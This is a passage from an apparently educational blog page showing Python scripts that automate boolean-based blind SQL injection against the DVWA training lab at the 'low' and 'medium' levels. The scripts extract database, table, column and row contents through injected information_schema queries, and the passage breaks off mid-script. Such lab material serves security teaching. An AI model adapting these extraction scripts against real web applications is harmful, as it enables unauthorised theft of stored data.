class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Injection</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.zifuji = [<span class="number">44</span>,<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">45</span>, <span class="number">64</span>, <span class="number">33</span>, <span class="number">38</span>, <span class="number">36</span>]</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(self,yourstr,num1,num2)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]"</span>.format(yourstr,str(num1),str(num2)),end=<span class="string">'\r'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"User ID exists in the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"User ID is MISSING from the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_itsnum()</span><br><span class="line">        self.get_database_length()</span><br><span class="line">        self.get_database()</span><br><span class="line">        self.get_table_num()</span><br><span class="line">        self.table_length = []</span><br><span class="line">        self.table_name = []</span><br><span class="line">        self.get_table_length()</span><br><span class="line">        self.get_table_name()</span><br><span class="line">        table_name = input(<span class="string">'[-] table_name: '</span>)</span><br><span class="line">        self.get_column_num(table_name)</span><br><span class="line">        self.column_length = []</span><br><span class="line">        self.column_name = []</span><br><span class="line">        self.get_column_length(table_name)</span><br><span class="line">        self.get_column_name(table_name)</span><br><span class="line">        column_names = input(<span class="string">'[-] column_name: '</span>).split(<span class="string">','</span>)</span><br><span class="line">        self.word_num = <span class="number">0</span></span><br><span class="line">        self.get_word_num(table_name,column_names[<span class="number">0</span>])</span><br><span class="line">        self.word_name = []</span><br><span class="line">        self.word_length = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(column_names)):</span><br><span class="line">            print(column_names[i])</span><br><span class="line">            self.get_word_length(table_name,column_names[i])</span><br><span class="line">            self.get_word_name(table_name,column_names[i],i)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_itsnum</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.itsnum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_itsnum'</span>,i,<span class="number">50</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' order by &#123;0&#125;%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check(html):</span><br><span class="line">                self.itsnum = i - <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.itsnum &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.itsnum)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the itsnum"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_database_length'</span>,i,<span class="number">30</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and length(database())=&#123;0&#125;%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.database_length = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.database_length &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the database_length"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.database = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.database_length+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(str(i) + <span class="string">' get_database'</span>,j,self.database_length+<span class="number">1</span>)</span><br><span class="line">                theurl = self.url + <span class="string">"1' and ascii(substring(database(),&#123;0&#125;,1))=&#123;1&#125;%23"</span>.format(str(i),str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">                html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    self.database += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(self.database) != i:</span><br><span class="line">                self.database += <span class="string">'666'</span></span><br><span class="line">        <span class="keyword">if</span> len(self.database) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.database)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\n can not get the database"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.table_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the table_num"</span>)           </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_length</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_table_length'</span>,i,<span class="number">50</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a=&#123;0&#125;)%23"</span>.format(str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.table_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.table_length[<span class="number">0</span>] &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.table_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_table_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.table_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_table_name'</span>.format(i),j,<span class="number">50</span>)</span><br><span class="line">                theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a=&#123;1&#125;)%23"</span>.format(str(i),str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">                html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,name)</span><br><span class="line">            self.table_name.append(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the table_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_num</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        self.column_num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23"</span>.format(table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.column_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_num)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_length</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_column_length'</span>,i,<span class="number">100</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='&#123;0&#125;' having a=&#123;1&#125;)%23"</span>.format(table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.column_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.column_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_length'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_column_name</span><span class="params">(self,table_name)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.column_length[<span class="number">0</span>]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'&#123;0&#125; get_column_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name='&#123;1&#125;' having a=&#123;2&#125;)%23"</span>.format(str(i),table_name,str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">                html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        <span class="keyword">if</span> len(name) == self.column_length[<span class="number">0</span>]:</span><br><span class="line">            self.column_name.append(name)</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.column_name[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the column_name'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_num</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">            self.process(<span class="string">'get_word_num'</span>,i,<span class="number">30</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select count(&#123;0&#125;) as a from &#123;1&#125; having a=&#123;2&#125;)%23"</span>.format(column_name,table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_num = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.word_num &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word_num'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_length</span><span class="params">(self,table_name,column_name)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">            self.process(<span class="string">'get_&#123;0&#125;_length'</span>.format(column_name),i,<span class="number">200</span>)</span><br><span class="line">            theurl = self.url + <span class="string">"1' and (select length(group_concat(&#123;0&#125;)) as a from &#123;1&#125; having a=&#123;2&#125;)%23"</span>.format(column_name,table_name,str(i)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">            html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> self.check(html):</span><br><span class="line">                self.word_length.append(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> len(self.word_length) &gt;= <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.word_length)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\ncan not get the word length'</span>) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_word_name</span><span class="params">(self,table_name,column_name,word_num)</span>:</span></span><br><span class="line">        name = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,self.word_length[word_num]+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> self.zifuji:</span><br><span class="line">                self.process(<span class="string">'get_&#123;0&#125;_name'</span>.format(str(i)),j,<span class="number">100</span>)</span><br><span class="line">                theurl = self.url + <span class="string">"1' and (select ascii(substring(group_concat(&#123;0&#125;),&#123;1&#125;,1)) as a from &#123;2&#125; having a=&#123;3&#125;)%23"</span>.format(column_name,str(i),table_name,str(j)) + <span class="string">"&amp;Submit=Submit#"</span></span><br><span class="line">                html = self.s.get(theurl,headers=self.headers).text</span><br><span class="line">                <span class="keyword">if</span> self.check(html):</span><br><span class="line">                    name += chr(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> len(name) != i:</span><br><span class="line">                name += <span class="string">'|'</span></span><br><span class="line">        self.word_name.append(name)</span><br><span class="line">        print(<span class="string">'\n==&gt;'</span>,self.word_name[word_num])</span><br></pre></td></tr></table></figure><h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Injection</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        self.s = requests.session()</span><br><span class="line">        self.zifuji = [<span class="number">44</span>,<span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">57</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">106</span>, <span class="number">107</span>, <span class="number">108</span>, <span class="number">109</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">113</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">118</span>, <span class="number">119</span>, <span class="number">120</span>, <span class="number">121</span>, <span class="number">122</span>, <span class="number">65</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">77</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">85</span>, <span class="number">86</span>, <span class="number">87</span>, <span class="number">88</span>, <span class="number">89</span>, <span class="number">90</span>, <span class="number">95</span>, <span class="number">45</span>, <span class="number">64</span>, <span class="number">33</span>, <span class="number">38</span>, <span class="number">36</span>]</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">'security=medium; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(self,yourstr,num1,num2)</span>:</span></span><br><span class="line">        print(<span class="string">"[+] Please wait ... &#123;0&#125; [&#123;1&#125;]/[&#123;2&#125;]"</span>.format(yourstr,str(num1),str(num2)),end=<span class="string">'\r'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,text)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"User ID exists in the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">"User ID is MISSING from the database."</span> <span class="keyword">in</span> text:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tranhex</span><span class="params">(self,str1)</span>:</span></span><br><span class="line">        result = <span class="string">'0x'</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            result += hex(ord(i))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_itsnum()</span><br><span class="line">        self.get_database_length()</span><br><span class="line">        self.get_database()</span><br><span class="line">        self.get_table_num()</span><br><span class="line">        self.table_length = []</span><br><span class="line">        self.table_name = []</span><br><span class="line">        self.get_table_length()</span><br><span class="line">        self.get_table_name()</span><br><span class="line">        table_name = input(<span class="string">'[-] table_name: '</span>)</span><br><span class="line">        self.get_column_num(table_name)</span><br><span class="line">        self.column_length = []</span><br><span class="line">        self.column_name = []</span><br><span class="line">        self.get_column_length(table_name)</span><br><span class="line">        self.get_column_name(table_name)</span><br><span class="line">        column_names = input(<span class="string">'[-] column_name: '</span>).split(<span class="string">','</span>)</span><br><span class="line">        self.word_num = <span class="number">0</span></span><br><span class="line">        self.get_word_num(table_name,column_names[<span class="number">0</span>])</span><br><span class="line">        self.word_name = []</span><br><span class="line">        self.word_length = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(column_names)):</span><br><span class="line">            print(column_names[i])</span><br><span class="line">            self.get_word_length(table_name,column_names[i])</span><br><span class="line">            self.get_word_name(table_name,column_names[i],i)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_itsnum</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.itsnum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">            self.process(<span class="string">'get_itsnum'</span>,i,<span class="number">50</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'id'</span>:<span class="string">"1 order by &#123;0&#125;"</span>.format(str(i)),</span><br><span class="line">                <span class="string">'Submit'</span>:<span class="string">'Submit'</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            html = self.s.post(self.url,data=data,headers=self.headers).text</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check(html):</span><br><span class="line">                self.itsnum = i - <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> self.itsnum &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'\n==&gt;'</span>,self.itsnum)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"\ncan not get the itsnum"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_database_length</span><span class="params">(self)</span>:</span></span><br><span 